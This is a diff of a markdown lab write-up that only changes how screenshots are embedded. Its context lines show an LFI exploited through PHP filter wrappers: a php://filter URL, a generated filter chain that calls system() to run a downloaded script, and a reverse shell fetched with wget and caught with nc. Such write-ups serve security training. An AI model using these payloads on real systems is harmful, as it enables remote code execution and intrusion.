@@ -6,13 +6,13 @@ In this exercise, we will approach an LFI combined with PHP wrappers to gain acc
 
 First, we are going to confirm the existence of an LFI.
 
-![[Pasted image 20260314204044.png]]
+<img width="882" height="560" alt="Pasted image 20260314204044" src="https://github.com/user-attachments/assets/51d5f2e4-8066-426e-9b66-aeb8f9fad9b9" />
 
 We are now going to test if it is vulnerable to wrapper injection.
 
-![[Captura de pantalla 2026-03-13 183831.png]]
+<img width="992" height="111" alt="Captura de pantalla 2026-03-13 183831" src="https://github.com/user-attachments/assets/665401ec-2fc0-4034-afa8-577ebf0bd947" />
 
-![[Captura de pantalla 2026-03-13 185203.png]]
+<img width="1230" height="187" alt="Captura de pantalla 2026-03-13 185203" src="https://github.com/user-attachments/assets/6e1796c9-0250-4eae-bd38-99b0911ed2b1" />
 
 ```
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=include.php
@@ -32,11 +32,11 @@ We can find a tool to generate this PHP filter sequence in the following reposit
 
 [GitHub - synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
 
-![[Captura de pantalla 2026-03-13 184606.png]]
+<img width="1889" height="744" alt="Captura de pantalla 2026-03-13 184606" src="https://github.com/user-attachments/assets/310635d8-2daa-4d8d-86f4-b77d3e72bb1c" />
 
 Here we witness how, using this repository, our script is converted into the sequence that will be injected. Let's see how it is interpreted.
 
-![[Captura de pantalla 2026-03-13 185002.png]]
+<img width="1667" height="318" alt="Captura de pantalla 2026-03-13 185002" src="https://github.com/user-attachments/assets/e2173b14-c85c-43f5-90a6-4674a9bd2fb6" />
 
 The system receives it successfully. From this point, we can proceed to pass an HTML script containing a **reverse shell** to our attacker machine via `wget`.
 
@@ -59,7 +59,7 @@ python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.1')
 
 We run it on the page, and if we check our `nc`, we see that it worked correctly.
 
-![[Captura de pantalla 2026-03-14 202529.png]]
+<img width="654" height="182" alt="Captura de pantalla 2026-03-14 202529" src="https://github.com/user-attachments/assets/88e0d31c-8706-4ae6-a727-c92950d6f5ca" />
 
 ### Key points
 
